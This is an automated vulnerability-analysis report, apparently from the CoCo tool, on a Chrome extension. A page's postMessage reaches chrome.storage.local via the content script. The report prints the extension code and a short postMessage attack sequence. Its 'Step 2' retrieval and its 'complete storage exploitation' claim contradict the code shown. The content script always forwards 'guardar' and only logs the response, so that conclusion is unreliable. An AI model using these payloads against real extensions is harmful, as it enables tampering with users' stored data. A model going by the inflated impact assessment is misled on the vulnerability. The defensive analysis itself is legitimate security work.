# CoCo Analysis: eihcocccdoonohndeniaaifggplbdlnb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eihcocccdoonohndeniaaifggplbdlnb/opgen_generated_files/cs_0.js
Line 471: `window.addEventListener("message", function(event) {`
Line 483: `if (event.data.type == "FROM_PAGE_NET") {`
Line 488: `datos: event.data.text`

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 471)
window.addEventListener("message", function(event) {
    if (event.data.type == "FROM_PAGE_NET") {
        // Forward attacker-controlled data to background
        chrome.runtime.sendMessage({
            tipo: "guardar",
            datos: event.data.text // ← attacker-controlled
        }, function(response) {
            console.log(response.respuesta);
        });
    }
});

// Background - Message handler (bg.js Line 968)
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.tipo == "guardar") {
            // Store attacker-controlled data
            chrome.storage.local.set({value: request.datos}, function() { // ← storage.set sink
                sendResponse({
                    respuesta: "Respuesta desde extension: Valor guardado!"
                });
            });
            return true;
        } else if (request.tipo == "recoger") {
            // Attacker can retrieve the poisoned data!
            chrome.storage.local.get(['value'], function(result) {
                sendResponse({
                    respuesta: result.value // ← poisoned data flows back to attacker
                });
            });
            return true;
        }
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Step 1: Attacker webpage sends malicious data to extension
window.postMessage({
    type: "FROM_PAGE_NET",
    text: "attacker_controlled_payload"
}, "*");

// Step 2: Attacker retrieves the stored data
window.postMessage({
    type: "FROM_PAGE_NET",
    text: JSON.stringify({tipo: "recoger"})
}, "*");

// Alternative: Attacker can trigger retrieval by sending internal message if content script forwards it
// The extension will respond with the poisoned data via sendResponse
```

**Impact:** Complete storage exploitation chain. An attacker on a malicious webpage can poison the extension's chrome.storage.local by sending a postMessage with type "FROM_PAGE_NET". The attacker can then retrieve the poisoned data by triggering the "recoger" (retrieve) flow, which reads from storage and returns the value via sendResponse. This allows the attacker to both write and read arbitrary data from the extension's storage, achieving complete storage exploitation.
